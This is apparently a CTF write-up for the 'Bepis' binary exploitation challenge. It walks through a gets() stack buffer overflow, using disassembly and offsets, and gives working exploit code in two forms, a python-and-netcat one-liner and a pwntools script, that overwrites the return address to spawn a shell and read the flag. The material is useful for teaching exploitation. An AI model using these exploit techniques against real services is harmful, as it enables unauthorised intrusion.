# Bepis
* **Event:** BepisCTF (ISSS CTF 09-06-2016)
* **Problem Type:** Binary Exploitation

## Background
[Netcat](https://en.wikipedia.org/wiki/Netcat) is an invaluable tool for testing networking and connecting to servers.

[Objdump](https://linux.die.net/man/1/objdump) Allows you to dump compiled code into readable assembly

[Pwntools](https://github.com/arthaud/python3-pwntools) is very useful when exploiting more complicated services.

[GDB](http://man7.org/linux/man-pages/man1/gdb.1.html) allows you to easily debug programs and see what is happening inside them at runtime.

## Steps
### Connect to the server with netcat
```
$ nc ctf.iss.io 9002
Welcome to the Bepis remote access database.
Enter password:
uhhhh
Authentication not implemented yet, come back later.
```
This just gives us an idea of what the program does.

### Look at source :)
The source is provided for us!
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

int do_auth(char * pass);
void login();
void get_flag();

int main() {
  printf("Welcome to the Bepis remote access database.\n");
  login();
  return 1;
}

int do_auth(char * pass) {
  printf("Authentication not implemented yet, come back later.\n");
  return 0;
}

void login() {
  printf("Enter password:\n");
  char buffer_123[30];
  gets(buffer_123);
  if(do_auth(buffer_123)) {
    get_flag();
  }
}

void get_flag() {
  char*  args[2] = {"/bin/sh", NULL};
  execve(args[0], args, NULL);
}
```
Basically we want to find some way to call `get_flag`. If we read the man page for gets() it says:
```
Never use gets().  Because it is impossible to tell without knowing the data in advance  how  many  characters
       gets()  will  read, and because gets() will continue to store characters past the end of the buffer, it is ex‐
       tremely dangerous to use.  It has been used to break computer security.  Use fgets() instead.
```

The wikipedia page for buffer overflow says:
```
By overwriting the return address in a stack frame. Once the function returns,
execution will resume at the return address as specified by the attacker
- usually a user-input filled buffer
```

This seems like a promising way to call `get_flag`

### Look at assembly
```
$ objdump -M intel --disassemble=login pwnable
00000000004005f2 <login>:
  4005f2:       55                      push   rbp                          @ Store rbp for main
  4005f3:       48 89 e5                mov    rbp,rsp
  4005f6:       48 83 ec 20             sub    rsp,0x20
  4005fa:       bf 5d 07 40 00          mov    edi,0x40075d
  4005ff:       e8 6c fe ff ff          call   400470 <puts@plt>
  400604:       48 8d 45 e0             lea    rax,[rbp-0x20]               @ This is where name is
  400608:       48 89 c7                mov    rdi,rax
  40060b:       b8 00 00 00 00          mov    eax,0x0
  400610:       e8 8b fe ff ff          call   4004a0 <gets@plt>
  400615:       48 8d 45 e0             lea    rax,[rbp-0x20]
  400619:       48 89 c7                mov    rdi,rax
  40061c:       e8 b4 ff ff ff          call   4005d5 <do_auth>
  400621:       85 c0                   test   eax,eax
  400623:       74 0a                   je     40062f <login+0x3d>
  400625:       b8 00 00 00 00          mov    eax,0x0
  40062a:       e8 03 00 00 00          call   400632 <get_flag>
  40062f:       90                      nop
  400630:       c9                      leave
  400631:       c3                      ret
```
The stack should look something like this:
```
[saved rip for main]
[saved rbp for main]
[name + 0x20]
[name + 0x1f]
...
```

### Write an exploit
We can see that if we overwrite 0x28 bytes, the next 8 bytes written will overwrite the saved rip for main.
To determine what to overwrite the saved rip with we need to know where `get_flag` is.
```
$ objdump -M intel -disassemble=get_flag pwnable
...
0000000000400632 <get_flag>:
...
```

We can write the exploit like this:
```
(python3 -c "print('a'*0x28 + '\x32\x06\x40\x00\x00\x00\x00\x00')"; cat -) | nc ctf.isss.io 9002

Welcome to the Bepis remote access database.
Enter password:
Authentication not implemented yet, come back later.
ls
flag.txt
cat flag.txt
utflag{c0rrupt_byt3s}
```
The `get_flag` bytes are backwards because of [little endianness](https://en.wikipedia.org/wiki/Endianness)

### Writing an exploit with pwntools
Pwntools is great for harder binary exploitation challenges.

```
from pwn import *

r = remote("ctf.isss.io", 9002)
r.readline()
addr = 0x0000000000400632
r.sendline(b'a'*40 + p64(addr))
r.interactive()

from pwn import *
```
